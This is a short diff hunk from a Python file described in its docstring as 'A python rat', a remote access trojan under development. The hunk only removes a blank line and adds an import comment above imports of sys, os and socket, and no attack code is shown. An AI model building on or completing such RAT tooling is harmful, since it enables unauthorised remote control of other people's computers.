@@ -4,9 +4,9 @@ A python rat
 Note this tool is under development
 github link: https://www.github.com/krishpranav
 follow me on github :)
-
 '''
 
+#imports
 import sys
 import os
 import socket
